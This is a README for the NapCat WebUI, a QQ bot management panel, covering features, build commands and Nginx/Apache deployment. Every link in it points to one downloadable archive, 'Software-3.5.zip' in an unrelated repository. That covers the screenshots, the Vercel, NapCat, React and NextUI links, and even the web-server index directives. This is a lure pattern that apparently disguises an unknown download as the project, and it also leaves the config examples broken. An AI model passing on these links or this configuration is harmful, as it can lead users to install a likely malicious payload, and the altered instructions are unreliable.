# WebUI 目前已经合并进 NapCat 仓库，本仓库不再更新。

# WebUI 目前已经合并进 NapCat 仓库，本仓库不再更新。

# WebUI 目前已经合并进 NapCat 仓库，本仓库不再更新。

# NapCat WebUI

## 功能

- WebUI登录
- QQ登录
- 网络配置
- OneBot/WebUI配置
- 日志查看（实时日志、历史日志）
- HTTP调试
- WS调试
- 在线音乐播放器，支持网易云音乐歌单（大屏在页面右下角，小屏在页面下方）

如果你有更多功能需求，欢迎在 issue 中提出。

## Screenshots

| 场景 | 亮色 | 暗色 |
|------|------|------|
| WebUI登录 | ![WebUI登录](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) | ![WebUI登录](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) |
| QQ登录 | ![QQ登录](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) | ![QQ登录](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) |
| 网络列表 | ![网络配置](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) | ![网络配置](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) |
| 网络编辑 | ![网络配置](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) | ![网络配置](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) |
| 日志 | ![日志](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) | ![日志](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) |
| HTTP调试 | ![WS调试](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) | ![WS调试](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) |
| WS调试 | ![WS调试](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) | ![WS调试](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) |

## Directly deploy via [Vercel](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip)

Recommended if you only use localhost NapCat.

1. Fork this repository
2. Create a new project on Vercel
3. Import the forked repository
4. Configure the project settings
   1. Edit the build command to `npm run webui:build`
   2. Edit your custom domain
5. Deploy the project


# Build

## Via NPM

```bash
$ npm install
$ npm run webui:build
```

## Via Yarn

```bash
$ yarn install
$ yarn webui:build
```

## Via PNPM

```bash
$ pnpm install
$ pnpm webui:build
```

# Deploy

## Via Nginx 

Recommended if you deploy on your own server. Often used to resolve `Network Error` (HTTPS can't request HTTP) in your browser.

```nginx
server {
    listen 80;
    server_name localhost;

    location / {
        root /path/to/napcat-webui/dist;
        index https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip;
        try_files $uri $uri/ https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip;
    }
}
```

## Via Apache

```apache
<VirtualHost *:80>
    ServerName localhost

    DocumentRoot /path/to/napcat-webui/dist
    DirectoryIndex https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip

    <Directory /path/to/napcat-webui/dist>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
</VirtualHost>
```

# Development

via NPM

```bash
$ npm install
$ npm run webui:dev
```

via Yarn

```bash
$ yarn install
$ yarn webui:dev
```

via PNPM

```bash
$ pnpm install
$ pnpm webui:dev
```

# License

[MIT](LICENSE)

# Related Projects

- [NapCat](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip)
- [Karin](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip)

# Thanks to

- [Vercel](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip)
- [React](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip)
- [NextUI](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip)
- and more open-source projects

感谢群友“维拉”提供的在线音乐API。